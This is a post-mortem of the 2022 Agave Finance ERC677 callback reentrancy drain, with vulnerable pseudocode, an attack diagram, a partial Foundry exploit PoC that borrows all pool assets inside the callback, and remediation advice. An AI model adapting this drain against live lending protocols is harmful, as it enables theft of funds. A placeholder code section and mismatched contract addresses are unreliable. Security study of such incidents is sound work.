# Agave Finance — ERC677 Callback Reentrancy Loan Drain Analysis

| Field | Details |
|------|------|
| **Date** | 2022-03-15 |
| **Protocol** | Agave Finance (Aave V2 Fork) |
| **Chain** | Gnosis Chain (xDAI) |
| **Loss** | ~$5,500,000 (WETH, LINK, USDC, GNO, WBTC, WXDAI) |
| **Attacker** | [0x0a16a85be44627c10cee75db06b169c7bc76de2c](https://gnosisscan.io/address/0x0a16a85be44627c10cee75db06b169c7bc76de2c) |
| **Attack Contract** | [0xF98169301B06e906AF7f9b719204AA10D1F160d6](https://gnosisscan.io/address/0xF98169301B06e906AF7f9b719204AA10D1F160d6) |
| **Vulnerable Contract** | Agave Lending Pool [0x207E9def17B4bd1045F5Af2C651c081F9FDb0842](https://gnosisscan.io/address/0x207E9def17B4bd1045F5Af2C651c081F9FDb0842) |
| **Root Cause** | Reentrancy via the `onTokenTransfer` callback of Gnosis Chain bridge tokens (ERC677), enabling additional borrows before the health factor is updated |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/Agave_exp.sol) |

---
## 1. Vulnerability Overview

Agave Finance is an Aave V2 fork lending protocol deployed on Gnosis Chain. Bridge assets on Gnosis Chain (xDAI, LINK, etc.) implement the ERC677 standard, which triggers an `onTokenTransfer(address,uint256,bytes)` callback to the recipient upon token transfer.

Agave did not account for this callback mechanism. The attacker executed the reentrancy in the following sequence:
1. Deposited WETH and LINK to create a healthy position
2. Warped time forward to bring the health factor below 1
3. Triggered `liquidationCall`, causing an ERC677 callback to fire during aToken burning
4. Within the callback, borrowed all available assets **before** the health factor was updated

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable Agave LendingPool (Aave V2 fork, pseudocode)
function liquidationCall(
    address collateralAsset,
    address debtAsset,
    address user,
    uint256 debtToCover,
    bool receiveAToken
) external {
    // Collateral calculation and processing
    uint256 collateralAmount = _calculateCollateral(user, collateralAsset, debtToCover);

    // ❌ aToken burn — triggers ERC677 callback
    // At this point, the user's health factor has not yet been updated
    IAToken(collateralAToken).burn(
        user,
        msg.sender,      // ← tokens sent to liquidator (attacker)
        collateralAmount,
        reserve.liquidityIndex
    );

    // ❌ borrow() can be called from within the ERC677 onTokenTransfer callback
    // healthFactor has not yet been reflected at this point

    // Debt processing (after callback)
    _updateState(debtAsset, debtToCover);
    // ← health factor is updated only here
}

// ✅ Correct pattern (with ReentrancyGuard)
function liquidationCall(...) external nonReentrant {
    // ... same logic but reentrancy is blocked
}
```


### On-Chain Original Code

Source: Source unverified

> ⚠️ No on-chain source code — bytecode only or source not verified

**Vulnerable Function** — `vulnerableFunction()`:
```solidity
// ❌ Root cause: Reentrancy via the `onTokenTransfer` callback of Gnosis Chain bridge tokens (ERC677), enabling additional borrows before the health factor is updated
// Source code unverified — bytecode analysis required
// Vulnerability: Reentrancy via the `onTokenTransfer` callback of Gnosis Chain bridge tokens (ERC677), enabling additional borrows before the health factor is updated
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker Contract
    │
    ├─[1] _initHF(): Initialize position
    │       Deposit WETH → Borrow LINK (health factor > 1)
    │
    ├─[2] vm.warp(+1 hour): Time elapsed
    │       Interest accrues → health factor < 1
    │
    ├─[3] _flashWETH(): Execute flash loan
    │       Borrow ~2,728 WETH from Uniswap
    │
    ├─[4] liquidationCall(WETH, LINK, attacker, MAX, false)
    │       Trigger liquidation
    │       ↓
    │   aWETH.burn() executes
    │       ↓ ERC677 onTokenTransfer callback fires
    │           │
    │           ├─ borrowTokens() reenters
    │           │       Borrow all of USDC, GNO, LINK, WBTC, WXDAI
    │           │       (possible because health factor not yet updated)
    │           │
    │           └─ callback returns
    │
    ├─[5] aWETH withdraw(): Withdraw remaining aWETH
    │
    └─[6] Repay flash loan + transfer drained assets
            Loss: ~$5,500,000
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface ILendingPool {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
    function liquidationCall(address collateral, address debt, address user, uint256 debtToCover, bool receiveAToken) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}

contract AgaveExploit is Test {
    ILendingPool lendingPool =
        ILendingPool(0x5E15d5E33d318dCEd84Bfe3F4EACe07909bE6d9c);

    IERC20 WETH  = IERC20(0x6A023CCd1ff6F2045C3309768eAd9E68F978f6e1);
    IERC20 LINK  = IERC20(0xE2e73A1c69ecF83F464EFCE6A5be353a37cA09b2);
    IERC20 USDC  = IERC20(0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83);
    IERC20 GNO   = IERC20(0x9C58BAcC331c9aa871AFD802DB6379a98e80CEdb);
    IERC20 WBTC  = IERC20(0x8e5bBbb09Ed1ebdE8674Cda39A0c169401db4252);
    IERC20 WXDAI = IERC20(0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d);

    function setUp() public {
        vm.createSelectFork("gnosis", 21_120_283);
    }

    // ERC677 callback: automatically called when aToken is burned
    function onTokenTransfer(address, uint256, bytes calldata) external {
        // ⚡ Reentrancy entry point: before health factor is updated
        // All assets can be borrowed here
        _borrowAllAssets();
    }

    function _borrowAllAssets() internal {
        // Borrow all of USDC, GNO, LINK, WBTC, WXDAI
        lendingPool.borrow(address(USDC),  USDC.balanceOf(address(lendingPool)),  2, 0, address(this));
        lendingPool.borrow(address(GNO),   GNO.balanceOf(address(lendingPool)),   2, 0, address(this));
        lendingPool.borrow(address(LINK),  LINK.balanceOf(address(lendingPool)),  2, 0, address(this));
        lendingPool.borrow(address(WBTC),  WBTC.balanceOf(address(lendingPool)),  2, 0, address(this));
        lendingPool.borrow(address(WXDAI), WXDAI.balanceOf(address(lendingPool)), 2, 0, address(this));
    }

    function testExploit() public {
        // [Step 1] Set up initial position
        _initHF();

        // [Step 2] Elapse time (deteriorate health factor)
        vm.warp(block.timestamp + 1 hours);

        // [Step 3] Obtain liquidation funds via flash loan
        _flashWETH();

        emit log_named_decimal_uint("[Profit] USDC", USDC.balanceOf(address(this)), 6);
    }

    function _initHF() internal {
        // Deposit WETH then borrow LINK to set health factor
        WETH.approve(address(lendingPool), type(uint256).max);
        lendingPool.deposit(address(WETH), 1 ether, address(this), 0);
        lendingPool.borrow(address(LINK), 0.7 ether, 2, 0, address(this));
        lendingPool.borrow(address(WETH), 1, 2, 0, address(this));
    }

    function _flashWETH() internal {
        // Obtain liquidation funds via Uniswap flash loan, then execute liquidationCall
        // (in the actual implementation, handled inside the uniswapV2Call callback)
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy Attack (Cross-Function Reentrancy) |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **OWASP DeFi** | ERC677 Callback Reentrancy |
| **Attack Vector** | ERC677 `onTokenTransfer` → re-borrow before health factor update |
| **Preconditions** | Aave V2 fork supporting bridge tokens (ERC677) as collateral |
| **Impact** | Full protocol liquidity drain |

---
## 6. Remediation Recommendations

1. **Apply ReentrancyGuard**: Add the `nonReentrant` modifier to core functions such as `liquidationCall`, `borrow`, and `withdraw`.
2. **Special Handling for ERC677/ERC1363 Tokens**: When allowing token standards that trigger callbacks, proactively review reentrancy risk.
3. **Checks-Effects-Interactions Pattern**: State updates (health factor) must be completed before external calls (token transfers).
4. **Token Compatibility Audit When Forking Aave**: Always review differences between token standards on the original Aave deployment chain and the target deployment chain.

---
## 7. Lessons Learned

- **Hidden Risks of Forks**: Even when forking Aave V2, differing token standards on the deployment chain can introduce new vulnerabilities. Gnosis Chain's ERC677 is a prime example.
- **Dangers of Callback Standards**: Token standards that trigger callbacks — ERC777, ERC677, ERC1363, etc. — all carry inherent reentrancy risk.
- **$5.5M Loss**: HundredFinance was also attacked with the same vulnerability on the same day (cascading attack).
- **Chain-Specificity of Audits**: Audit results based on Ethereum should never be assumed to apply equally to other chains.